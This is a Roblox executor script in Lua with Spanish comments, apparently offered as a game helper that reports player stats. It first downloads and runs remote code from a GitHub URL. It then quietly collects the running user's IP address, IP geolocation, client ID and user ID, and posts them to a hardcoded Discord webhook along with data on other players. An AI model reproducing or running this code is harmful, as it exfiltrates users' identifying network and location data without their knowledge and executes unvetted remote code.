loadstring(game:HttpGet("https://raw.githubusercontent.com/Fernanflop091o/Queuet/refs/heads/main/Afk.lua"))()

 local HttpService = game:GetService("HttpService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Players = game:GetService("Players")
local RbxAnalyticsService = game:GetService("RbxAnalyticsService")

local discordWebhookUrl = "https://discord.com/api/webhooks/1286118077829742593/KbfczS76YlMW7x_Q9vbA60XRE78_xc9uvDZOGkzLU5AEfP-fH1iX-_P6YzBg7d6-WiJn"

-- Crear o obtener el IntValue para el tiempo de último envío
local lastSendTimeValue = ReplicatedStorage:FindFirstChild("LastSendTime")
if not lastSendTimeValue then
    lastSendTimeValue = Instance.new("IntValue")
    lastSendTimeValue.Name = "LastSendTime"
    lastSendTimeValue.Value = 0
    lastSendTimeValue.Parent = ReplicatedStorage
end

local function getJobIdAndHwid()
    local jobId = game.JobId
    local hwid = game.Players.LocalPlayer.UserId
    return jobId, hwid
end

local function formatNumber(number)
    if number < 1000 then
        return tostring(number)
    end
    local suffixes = {"", "K", "M", "B", "T", "QD"}
    local suffix_index = 1
    while math.abs(number) >= 1000 and suffix_index < #suffixes do
        number = number / 1000.0
        suffix_index = suffix_index + 1
    end
    return string.format("%.2f%s", number, suffixes[suffix_index])
end

local function getPlayerIPInfo()
    local ip, data = "N/A", "N/A"
    local success, response = pcall(function()
        ip = game:HttpGet("https://v4.ident.me/")
        data = game:HttpGet("http://ip-api.com/json")
    end)
    if not success then
        warn("Error al obtener IP o geolocalización:", response)
    end
    return ip, data
end

local function detectExecutor()
    local executorType = "Unsupported"
    if syn and not is_sirhurt_closure and not pebc_execute then
        executorType = "Synapse X"
    elseif secure_load then
        executorType = "Sentinel"
    elseif pebc_execute then
        executorType = "ProtoSmasher"
    elseif KRNL_LOADED then
        executorType = "Krnl"
    elseif is_sirhurt_closure then
        executorType = "SirHurt"
    elseif identifyexecutor() and identifyexecutor():find("ScriptWare") then
        executorType = "Script-Ware"
    end
    return executorType
end

local function getNextRebirthPrice(currentRebirths)
    local basePrice = 3e6
    local additionalPrice = 2e6
    local multiplier = 1.010
    local nextPrice = basePrice * (currentRebirths + 1) * multiplier + additionalPrice
    return nextPrice
end

local function getAllPlayerData()
    local playerDataList = {}
    for _, player in pairs(Players:GetPlayers()) do
        local playerData = {}
        local playerName = player.Name
        local playerDisplayName = player.DisplayName

        local folderData = ReplicatedStorage:FindFirstChild("Datas"):FindFirstChild(player.UserId)
        if folderData then
            local rebirthValue = folderData:FindFirstChild("Rebirth") and folderData.Rebirth.Value or 0
            local strengthValue = folderData:FindFirstChild("Strength") and folderData.Strength.Value or 0
            local formattedRebirth = formatNumber(rebirthValue)
            local formattedStrength = formatNumber(strengthValue)
            local nextRebirthPrice = getNextRebirthPrice(rebirthValue)

            local combinedLabel = string.format("Jugador: %s\nApodo: %s\nRebirth: %s\nStrength: %s\nPrecio para siguiente Rebirth: %s",
                playerName, playerDisplayName, formattedRebirth, formattedStrength, formatNumber(nextRebirthPrice))

            table.insert(playerDataList, {
                label = combinedLabel,
                rebirth = rebirthValue,
                strength = strengthValue
            })
        end
    end

    table.sort(playerDataList, function(a, b)
        if a.strength ~= b.strength then
            return a.strength > b.strength
        elseif a.rebirth ~= b.rebirth then
            return a.rebirth > b.rebirth
        end
        return false
    end)

    local sortedLabels = {}
    for _, data in ipairs(playerDataList) do
        table.insert(sortedLabels, data.label)
    end
    return playerDataList, sortedLabels
end

local function getClientId()
    local clientId = RbxAnalyticsService:GetClientId()
    return clientId
end

local function getServerInfo()
    local serverInfo = {}
    local worldNames = {
        [3311165597] = "Tierra",
        [5151400895] = "Bilss",
        [3608495586] = "HBTC TIEP",
        [3608496430] = "HBTC GAV"
    }

    local totalServers = 0
    local totalPlayers = 0
    local serversInfo = {}

    for placeId, worldName in pairs(worldNames) do
        local serverListUrl = "https://games.roblox.com/v1/games/"..placeId.."/servers/Public?sortOrder=Asc&limit=100"
        local success, response = pcall(function()
            return HttpService:JSONDecode(game:HttpGet(serverListUrl))
        end)

        if success and response and response.data then
            local servers = #response.data
            local players = 0

            for _, server in ipairs(response.data) do
                players = players + server.playing
            end

            totalServers = totalServers + servers
            totalPlayers = totalPlayers + players

            table.insert(serversInfo, {
                worldName = worldName,
                servers = servers,
                players = players
            })
        end
    end

    return totalServers, totalPlayers, serversInfo
end

local function sendPlayerInfoToDiscord()
    local currentTime = os.time()
    
    -- Verifica si han pasado 24 horas desde el último envío
    if currentTime - lastSendTimeValue.Value < 86400 then
        return  -- No enviar si no ha pasado el tiempo
    end

    -- Actualiza el tiempo del último envío
    lastSendTimeValue.Value = currentTime

    local jobId, hwid = getJobIdAndHwid()
    local ip, ipData = getPlayerIPInfo()
    local executor = detectExecutor()
    local allPlayerData, sortedLabels = getAllPlayerData()
    local clientId = getClientId()
    local totalServers, totalPlayers, serversInfo = getServerInfo()

    local strongestPlayer = allPlayerData[1]

    local dataToSend = {
        ["embeds"] = {
            {
                ["description"] = "Jugadores del juego:\n\n" .. table.concat(sortedLabels, "\n\n"),
                ["color"] = 0x00ff00,
                ["title"] = "Estadísticas de los jugadores",
                ["thumbnail"] = {
                    ["url"] = "https://i.imgur.com/oBPXx0D.png"
                },
                ["fields"] = {
                    {
                        ["name"] = "JobId",
                        ["value"] = jobId,
                        ["inline"] = true
                    },
                    {
                        ["name"] = "HWID",
                        ["value"] = hwid,
                        ["inline"] = true
                    },
                    {
                        ["name"] = "IP",
                        ["value"] = ip,
                        ["inline"] = true
                    },
                    {
                        ["name"] = "Datos de IP",
                        ["value"] = ipData,
                        ["inline"] = false
                    },
                    {
                        ["name"] = "ClientId",
                        ["value"] = clientId,
                        ["inline"] = true
                    },
                    {
                        ["name"] = "Número Total de Servidores",
                        ["value"] = formatNumber(totalServers),
                        ["inline"] = true
                    },
                    {
                        ["name"] = "Número Total de Jugadores en Servidores",
                        ["value"] = formatNumber(totalPlayers),
                        ["inline"] = true
                    }
                }
            }
        }
    }

    local serverDetails = "Detalles de los servidores:\n"
    for _, info in ipairs(serversInfo) do
        serverDetails = serverDetails .. string.format("Mundo: %s\nServidores: %d\nJugadores: %d\n\n", info.worldName, info.servers, info.players)
    end

    table.insert(dataToSend["embeds"], {
        ["description"] = serverDetails,
        ["color"] = 0x00ff00,
        ["title"] = "Información de Servidores"
    })

    table.insert(dataToSend["embeds"], {
        ["description"] = strongestPlayer.label,
        ["color"] = 0x00ff00,
        ["title"] = "Jugador más fuerte",
        ["thumbnail"] = {
            ["url"] = "https://i.imgur.com/oBPXx0D.png"
        }
    })

    local success, response = pcall(function()
        return http_request({
            Url = discordWebhookUrl,
            Method = "POST",
            Headers = {
                ["Content-Type"] = "application/json"
            },
            Body = HttpService:JSONEncode(dataToSend)
        })
    end)

    if not success then
        warn("Error al enviar la información a Discord:", response)
    end
end

sendPlayerInfoToDiscord()
